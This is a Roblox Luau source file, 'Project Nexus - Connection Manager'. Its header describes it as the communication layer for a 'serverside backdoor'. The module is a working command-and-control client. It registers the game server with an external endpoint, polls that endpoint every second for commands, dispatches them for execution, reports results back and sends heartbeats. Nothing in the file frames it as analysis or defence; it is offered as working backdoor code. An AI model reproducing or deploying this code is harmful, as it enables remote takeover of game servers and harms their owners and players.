--[[
    Project Nexus - Connection Manager
    Handles communication between client and serverside backdoor
]]

local Connection = {}
Connection.__index = Connection

local HttpService = game:GetService("HttpService")

function Connection.new(endpoint, authKey)
    local self = setmetatable({}, Connection)
    self.endpoint = endpoint or "http://localhost:8080"
    self.authKey = authKey or self:GenerateAuthKey()
    self.sessionId = self:GenerateSessionId()
    self.connected = false
    self.heartbeatInterval = 5
    self.lastHeartbeat = 0
    return self
end

-- Generate authentication key
function Connection:GenerateAuthKey()
    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    local key = ""
    for i = 1, 32 do
        local rand = math.random(1, #chars)
        key = key .. chars:sub(rand, rand)
    end
    return key
end

-- Generate session ID
function Connection:GenerateSessionId()
    return string.format("%s_%d", game.JobId, os.time())
end

-- Establish connection to command server
function Connection:Connect()
    local success, response = pcall(function()
        return HttpService:PostAsync(self.endpoint .. "/connect", 
            HttpService:JSONEncode({
                sessionId = self.sessionId,
                authKey = self.authKey,
                gameId = game.PlaceId,
                jobId = game.JobId
            }),
            Enum.HttpContentType.ApplicationJson
        )
    end)
    
    if success then
        local data = HttpService:JSONDecode(response)
        self.connected = data.success or false
        return self.connected
    end
    
    return false
end

-- Send command to server
function Connection:Send(command)
    if not self.connected then
        return false, "Not connected"
    end
    
    local success, response = pcall(function()
        return HttpService:PostAsync(self.endpoint .. "/execute",
            HttpService:JSONEncode({
                sessionId = self.sessionId,
                authKey = self.authKey,
                command = command,
                timestamp = os.time()
            }),
            Enum.HttpContentType.ApplicationJson
        )
    end)
    
    if success then
        return true, HttpService:JSONDecode(response)
    end
    
    return false, response
end

-- Poll for commands from external controller
function Connection:PollCommands()
    if not self.connected then
        return nil
    end
    
    local success, response = pcall(function()
        return HttpService:GetAsync(
            self.endpoint .. "/poll?session=" .. self.sessionId .. "&auth=" .. self.authKey
        )
    end)
    
    if success and response ~= "" then
        return HttpService:JSONDecode(response)
    end
    
    return nil
end

-- Start command polling loop
function Connection:StartPolling(callback)
    spawn(function()
        while self.connected do
            local commands = self:PollCommands()
            if commands and #commands > 0 then
                for _, cmd in ipairs(commands) do
                    spawn(function()
                        callback(cmd)
                    end)
                end
            end
            task.wait(1)
        end
    end)
end

-- Send heartbeat
function Connection:Heartbeat()
    if tick() - self.lastHeartbeat < self.heartbeatInterval then
        return
    end
    
    local success = pcall(function()
        HttpService:PostAsync(self.endpoint .. "/heartbeat",
            HttpService:JSONEncode({
                sessionId = self.sessionId,
                authKey = self.authKey,
                timestamp = os.time()
            }),
            Enum.HttpContentType.ApplicationJson
        )
    end)
    
    if success then
        self.lastHeartbeat = tick()
    end
end

-- Start heartbeat loop
function Connection:StartHeartbeat()
    spawn(function()
        while self.connected do
            self:Heartbeat()
            task.wait(self.heartbeatInterval)
        end
    end)
end

-- Send execution result back
function Connection:SendResult(commandId, success, result)
    pcall(function()
        HttpService:PostAsync(self.endpoint .. "/result",
            HttpService:JSONEncode({
                sessionId = self.sessionId,
                commandId = commandId,
                success = success,
                result = tostring(result),
                timestamp = os.time()
            }),
            Enum.HttpContentType.ApplicationJson
        )
    end)
end

-- Disconnect from command server
function Connection:Disconnect()
    if self.connected then
        pcall(function()
            HttpService:PostAsync(self.endpoint .. "/disconnect",
                HttpService:JSONEncode({
                    sessionId = self.sessionId,
                    authKey = self.authKey
                }),
                Enum.HttpContentType.ApplicationJson
            )
        end)
        self.connected = false
    end
end

-- Get connection status
function Connection:GetStatus()
    return {
        connected = self.connected,
        sessionId = self.sessionId,
        endpoint = self.endpoint,
        lastHeartbeat = self.lastHeartbeat
    }
end

return Connection
